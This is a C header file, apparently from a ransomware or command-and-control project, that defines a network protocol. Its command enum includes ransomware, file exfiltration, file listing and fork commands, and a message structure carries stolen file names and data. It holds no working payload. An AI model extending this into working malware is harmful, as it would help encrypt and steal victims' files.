#ifndef PROTOCOL_H
#define PROTOCOL_H

#define PORT 4242
#define BUFFER_SIZE 4096
#define ID_LENGTH 8
#define KEY_LENGTH 32
#define MAX_FILENAME_LENGTH 256

// Commands
typedef enum {
    CMD_RANSOMWARE = 1,
    CMD_EXFILTRATION = 2,
    CMD_FORK = 3,
    CMD_OUT = 4,
    CMD_LIST_FILES = 5,  // Nouvelle commande pour lister les fichiers
    CMD_EXFIL_FILE = 6   // Nouvelle commande pour exfiltrer un fichier spécifique
} Command;

// Message structure
typedef struct {
    char client_id[ID_LENGTH + 1];  // +1 for null terminator
    Command cmd;
    char filename[MAX_FILENAME_LENGTH];  // Pour stocker le nom du fichier exfiltré
    char data[BUFFER_SIZE];
} Message;

#endif // PROTOCOL_H
